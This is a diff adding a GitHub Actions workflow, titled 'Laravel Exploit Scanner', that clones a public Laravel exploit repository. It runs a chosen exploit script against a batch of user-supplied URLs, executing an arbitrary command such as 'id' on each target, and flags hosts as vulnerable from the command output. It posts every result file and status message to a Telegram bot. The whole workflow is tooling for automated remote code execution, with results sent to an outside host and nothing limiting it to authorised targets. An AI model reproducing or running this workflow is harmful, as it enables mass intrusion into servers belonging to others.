@@ -1,0 +1,113 @@
+name: Laravel Exploit Scanner
+
+on:
+  workflow_dispatch:
+    inputs:
+      urls:
+        description: 'URLs separated by spaces, commas, or mashed together (e.g., http://x.com/_ignition/execute-solutionhttp://y.com/...)'
+        required: true
+        type: string
+      command:
+        description: 'Command to execute if vulnerable (e.g., id, whoami)'
+        required: true
+        default: 'id'
+      script_name:
+        description: 'Python script name from ambionics repo (default: laravel-bleed.py)'
+        required: true
+        default: 'laravel-bleed.py'
+
+jobs:
+  laravel-exploit:
+    runs-on: ubuntu-latest
+    env:
+      FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true
+    
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Install Dependencies
+        run: |
+          sudo apt-get update && sudo apt-get install -y jq zip
+          pip3 install requests pycryptodome bs4
+
+      - name: Clone Exploit Repository
+        run: |
+          git clone https://github.com/ambionics/laravel-exploits.git || true
+          if [ ! -f "laravel-exploits/${{ github.event.inputs.script_name }}" ]; then
+            echo "ERROR: Script ${{ github.event.inputs.script_name }} not found in the repository!"
+            exit 1
+          fi
+
+      - name: Prepare URLs
+        env:
+          INPUT_URLS: ${{ github.event.inputs.urls }}
+        run: |
+          touch urls.txt
+          # Fix mashed URLs by adding newlines before http:// or https://
+          echo "$INPUT_URLS" | sed 's/https:/\nhttps:/g' | sed 's/http:/\nhttp:/g' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$' | sort -u > urls.txt
+          URL_COUNT=$(wc -l < urls.txt | xargs)
+          echo "Total URLs to test: ${URL_COUNT}"
+
+      - name: Notify Telegram Start
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+        run: |
+          URL_COUNT=$(wc -l < urls.txt | xargs)
+          MESSAGE="🦠 Laravel Exploit Scanner Starting"$'\n'$'\n'"URLs: ${URL_COUNT}"$'\n'"Command: ${{ github.event.inputs.command }}"$'\n'"Script: ${{ github.event.inputs.script_name }}"
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text=${MESSAGE}" || true
+
+      - name: Run Exploit Script
+        continue-on-error: true
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          CMD_INPUT: ${{ github.event.inputs.command }}
+          SCRIPT_INPUT: ${{ github.event.inputs.script_name }}
+        run: |
+          while IFS= read -r url; do
+            if [ -z "$url" ]; then continue; fi
+            
+            safe_name=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g' | cut -c 1-70)
+            RESULT_FILE="${{ github.workspace }}/${safe_name}_laravel.txt"
+            
+            echo "======================================" > "$RESULT_FILE"
+            echo "TESTING URL: $url" >> "$RESULT_FILE"
+            echo "======================================" >> "$RESULT_FILE"
+            
+            # Run the Python script with a 60-second timeout
+            timeout 60 python3 "laravel-exploits/$SCRIPT_INPUT" "$url" "$CMD_INPUT" >> "$RESULT_FILE" 2>&1 || true
+            
+            # Check if the command output (e.g., 'uid=' from 'id') is in the result
+            if grep -qi "uid=\|gid=\|root\|nobody\|www-data\|daemon" "$RESULT_FILE"; then
+              STATUS="🚨 VULNERABLE"
+            else
+              STATUS="✅ NOT VULNERABLE"
+            fi
+            
+            # Send clean status message to Telegram
+            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+              -d chat_id="${TELEGRAM_CHAT_ID}" \
+              --data-urlencode "text=${STATUS}: ${url}" || true
+            
+            # Send the raw text file output
+            if [ -f "$RESULT_FILE" ] && [ -s "$RESULT_FILE" ]; then
+              curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
+                -F chat_id="${TELEGRAM_CHAT_ID}" \
+                -F document="@${RESULT_FILE}" \
+                -F caption="🔬 Exploit Output - ${safe_name}" || true
+            fi
+            
+          done < urls.txt
+
+      - name: Pipeline Finished
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+        run: |
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text=🛑 Laravel Exploit Pipeline Completely Finished" || true
